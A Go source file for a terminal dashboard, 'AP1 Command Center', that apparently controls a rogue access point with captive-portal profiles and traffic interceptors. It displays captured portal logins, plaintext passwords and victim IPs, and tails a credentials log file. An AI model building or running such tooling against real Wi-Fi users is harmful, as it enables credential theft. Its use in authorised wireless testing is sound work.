package main

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/charmbracelet/bubbles/list"
	"github.com/charmbracelet/bubbles/viewport"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

type menuItem string

func (m menuItem) Title() string       { return string(m) }
func (m menuItem) Description() string {
	switch string(m) {
	case "Dashboard":
		return "Live monitoring of clients and credentials"
	case "System Status":
		return "Core services and network interfaces state"
	case "AP Profiles":
		return "Wireless configuration profiles"
	case "Plugins & Proxies":
		return "Active modules and traffic interceptors"
	case "Portal Logs":
		return "Live streaming of captured events"
	case "Quit":
		return "Exit the AP1 terminal interface"
	default:
		return ""
	}
}
func (m menuItem) FilterValue() string { return string(m) }

type tickMsg time.Time

type model struct {
	list     list.Model
	viewport viewport.Model
	content  string
	err      error
	ready    bool
	width    int
	height   int
	lastLog  string
}

var (
	titleStyle    = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#00ff00")).Padding(0, 1).Background(lipgloss.Color("#004400"))
	subtitleStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("#00ffff")).Bold(true)
	headerStyle   = lipgloss.NewStyle().Foreground(lipgloss.Color("#ffffff")).Background(lipgloss.Color("#5f00af")).Padding(0, 1)
	paneStyle     = lipgloss.NewStyle().Border(lipgloss.RoundedBorder()).BorderForeground(lipgloss.Color("#5f5f5f")).Padding(1, 1)
	sideStyle     = lipgloss.NewStyle().Border(lipgloss.NormalBorder()).BorderForeground(lipgloss.Color("#5f5f5f")).Width(30).Padding(1, 1)
	footerStyle   = lipgloss.NewStyle().Foreground(lipgloss.Color("#b0b0b0")).Italic(true)
	successStyle  = lipgloss.NewStyle().Foreground(lipgloss.Color("#00ff00"))
	warnStyle     = lipgloss.NewStyle().Foreground(lipgloss.Color("#ffff00"))
)

func startTUI() error {
	items := []list.Item{
		menuItem("Dashboard"),
		menuItem("System Status"),
		menuItem("AP Profiles"),
		menuItem("Plugins & Proxies"),
		menuItem("Portal Logs"),
		menuItem("Quit"),
	}
	delegate := list.NewDefaultDelegate()
	delegate.Styles.NormalTitle = lipgloss.NewStyle().Foreground(lipgloss.Color("#a0e0ff"))
	delegate.Styles.SelectedTitle = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#ffffff")).Background(lipgloss.Color("#005f87"))

	l := list.New(items, delegate, 30, 20)
	l.Title = "AP1 COMMAND CENTER"
	l.SetShowStatusBar(false)
	l.SetFilteringEnabled(false)
	l.SetShowHelp(false)

	m := model{
		list:    l,
		content: "AP1 Orchestrator initializing...",
	}

	p := tea.NewProgram(m, tea.WithAltScreen())
	_, err := p.Run()
	return err
}

func (m model) Init() tea.Cmd {
	return tick()
}

func tick() tea.Cmd {
	return tea.Every(time.Second*1, func(t time.Time) tea.Msg {
		return tickMsg(t)
	})
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd

	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height
		m.list.SetSize(30, m.height-6)
		if !m.ready {
			m.viewport = viewport.New(m.width-38, m.height-8)
			m.viewport.SetContent(m.content)
			m.ready = true
		} else {
			m.viewport.Width = m.width - 38
			m.viewport.Height = m.height - 8
		}

	case tickMsg:
		if sel := m.list.SelectedItem(); sel != nil {
			switch sel.FilterValue() {
			case "Dashboard":
				m.content = m.refreshDashboard()
			case "Portal Logs":
				m.content = m.refreshLogs()
			}
			m.viewport.SetContent(m.content)
		}
		return m, tick()

	case tea.KeyMsg:
		switch msg.String() {
		case "q", "ctrl+c":
			return m, tea.Quit
		case "enter":
			sel := m.list.SelectedItem()
			if sel == nil {
				return m, nil
			}
			switch sel.FilterValue() {
			case "Dashboard":
				m.content = m.refreshDashboard()
			case "System Status":
				m.content = m.refreshStatus()
			case "AP Profiles":
				m.content = fetchPrettyJSON("/api/profiles")
			case "Plugins & Proxies":
				m.content = m.refreshModules()
			case "Portal Logs":
				m.content = m.refreshLogs()
			case "Quit":
				return m, tea.Quit
			}
			m.viewport.SetContent(m.content)
			return m, nil
		}
	}

	var cmd tea.Cmd
	m.list, cmd = m.list.Update(msg)
	cmds = append(cmds, cmd)

	m.viewport, cmd = m.viewport.Update(msg)
	cmds = append(cmds, cmd)

	return m, tea.Batch(cmds...)
}

func (m model) refreshDashboard() string {
	var out strings.Builder
	out.WriteString(headerStyle.Render(" NETWORK ORCHESTRATOR DASHBOARD ") + "\n\n")

	// 1. Get Portal Status
	statusB, err := get("/api/status")
	if err == nil {
		var status map[string]interface{}
		json.Unmarshal(statusB, &status)
		cfg, _ := status["config"].(map[string]interface{})
		activeProfile := fmt.Sprint(cfg["active_profile"])
		net, _ := cfg["network"].(map[string]interface{})
		iface := fmt.Sprint(net["default_interface"])
		portalIP := fmt.Sprint(net["portal_ip"])

		out.WriteString(fmt.Sprintf("Active Profile: %s\n", subtitleStyle.Render(activeProfile)))
		out.WriteString(fmt.Sprintf("Interface:      %s\n", iface))
		out.WriteString(fmt.Sprintf("Gateway IP:     %s\n", portalIP))

		if pid, s := findServiceProcess("hostapd"); s == "running" {
			out.WriteString(fmt.Sprintf("Service AP:     %s\n", successStyle.Render("RUNNING (PID "+pid+")")))
		} else {
			out.WriteString(fmt.Sprintf("Service AP:     %s\n", warnStyle.Render("OFFLINE")))
		}
	}

	// 2. Get Credentials
	credsB, err := get("/api/portal/credentials")
	if err == nil {
		var creds []map[string]interface{}
		json.Unmarshal(credsB, &creds)
		out.WriteString(fmt.Sprintf("\nCaptured Events (%d):\n", len(creds)))
		out.WriteString(strings.Repeat("━", m.width-45) + "\n")

		start := 0
		if len(creds) > 12 {
			start = len(creds) - 12
		}
		for i := len(creds) - 1; i >= start; i-- {
			c := creds[i]
			out.WriteString(fmt.Sprintf(" %s %s | %s | %s\n",
				warnStyle.Render("→"),
				subtitleStyle.Render(fmt.Sprint(c["login"])),
				c["password"],
				infoStyle.Render(fmt.Sprint(c["ip"]))))
		}
	}

	return out.String()
}

func (m model) refreshStatus() string {
	var out strings.Builder
	out.WriteString(headerStyle.Render(" SYSTEM & INTERFACES ") + "\n\n")

	b, err := get("/api/interfaces")
	if err == nil {
		var interfaces []map[string]interface{}
		json.Unmarshal(b, &interfaces)
		for _, iface := range interfaces {
			stateColor := lipgloss.Color("#ff0000")
			if fmt.Sprint(iface["state"]) == "up" {
				stateColor = lipgloss.Color("#00ff00")
			}
			state := lipgloss.NewStyle().Foreground(stateColor).Render(fmt.Sprint(iface["state"]))
			out.WriteString(fmt.Sprintf("• %-10s [%s] MAC: %s\n", iface["name"], state, iface["mac"]))
		}
	}

	out.WriteString("\n" + headerStyle.Render(" BACKGROUND JOBS ") + "\n")
	// Simplified job list
	for _, service := range []string{"hostapd", "dnsmasq", "ap1_core"} {
		pid, status := findServiceProcess(service)
		statusStr := warnStyle.Render("STOPPED")
		if status == "running" {
			statusStr = successStyle.Render("RUNNING")
		}
		out.WriteString(fmt.Sprintf(" %-12s : %s (PID: %s)\n", service, statusStr, pid))
	}

	return out.String()
}

func (m model) refreshModules() string {
	var out strings.Builder
	out.WriteString(headerStyle.Render(" ACTIVE PLUGINS ") + "\n")
	b, _ := get("/api/plugins")
	var plugins []map[string]interface{}
	json.Unmarshal(b, &plugins)
	for _, p := range plugins {
		enabled := warnStyle.Render("NO")
		if p["enabled"].(bool) { enabled = successStyle.Render("YES") }
		out.WriteString(fmt.Sprintf(" [%s] %-15s | %s\n", enabled, p["name"], p["description"]))
	}
	return out.String()
}

func (m model) refreshLogs() string {
	var out strings.Builder
	out.WriteString(headerStyle.Render(" LIVE TRAFFIC LOGS ") + "\n\n")

	// Just read credentials log for now in TUI
	data, err := os.ReadFile("../system/runtime/portal_credentials.log")
	if err != nil {
		return "Waiting for logs..."
	}
	lines := strings.Split(string(data), "\n")
	if len(lines) > 20 {
		lines = lines[len(lines)-21:]
	}
	for _, line := range lines {
		if strings.TrimSpace(line) != "" {
			out.WriteString(line + "\n")
		}
	}
	return out.String()
}

func (m model) View() string {
	if !m.ready {
		return "\n  Initializing AP1 Command Center..."
	}

	header := titleStyle.Render(" AP1 v"+buildVersion+" ") + " " + subtitleStyle.Render(" EDGE-AWARE ORCHESTRATOR")
	footer := footerStyle.Render(" [↑/↓] Navigate  •  [Enter] Select  •  [q] Quit Terminal")

	left := sideStyle.Render(m.list.View())
	right := paneStyle.
		Width(m.width - 38).
		Height(m.height - 8).
		Render(m.viewport.View())

	body := lipgloss.JoinHorizontal(lipgloss.Top, left, right)
	return lipgloss.JoinVertical(lipgloss.Left, "\n"+header+"\n", body, footer)
}
